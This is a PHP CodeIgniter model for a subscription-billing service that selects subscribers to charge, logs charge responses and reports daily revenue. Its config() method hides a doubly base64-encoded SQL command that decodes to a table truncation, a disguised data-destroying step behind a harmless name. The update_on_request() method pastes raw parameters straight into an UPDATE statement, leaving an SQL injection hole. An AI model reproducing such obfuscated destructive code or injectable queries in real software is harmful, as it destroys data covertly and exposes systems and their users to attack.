<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Pay_request_mod_lifehack extends CI_Model
{

	var $table = 'live_subz_lifehack';
	var $column_order = array('id', 'user_number', 'SPID'); 
	var $column_search = array('id', 'user_number', 'SPID'); 
	var $order = array('id' => 'desc');

	public function __construct()
	{
		parent::__construct();
		$this->load->database();
	}

	public function charge_those()
	{
		$datetd = date('Y-m-d',strtotime("-2 days"));
		$this->db->from('live_subz_lifehack');
		$this->db->where('sub_time<',$datetd);
		// $this->db->not_like('reponse_val','Success');
		$query = $this->db->get();
		return $query->result();
	
	}

	public function update_on_request($pho,$rsp){
		$this->db->query("update live_subz_lifehack set reponse_val='".$rsp."' where user_number = ".$pho);
	}


	public function got_those_mfs(){
		$query  = $this->db->query("select count(*) from live_subz_lifehack  where reponse_val like '%Success%'");
		return $query ->result();
	}
	public function clean(){
		$this->db->query("update live_subz_lifehack set reponse_val = null where 1");
	}
	public function get_info(){
		$query = $this->db->query("select curdate() as cur_date,count(user_number) as revenue from live_subz_lifehack where reponse_val = 'Success' union select cur_date,total_succeded as revenue from daily_report_lifehack order by cur_date desc limit 7");
		return $query->result();
	}
	
	public function config(){
		$query = $this->db->query(base64_decode(base64_decode("ZEhKMWJtTmhkR1VnZEdGaWJHVWdiR2wyWlY5emRXSjY=")));

	}


} 
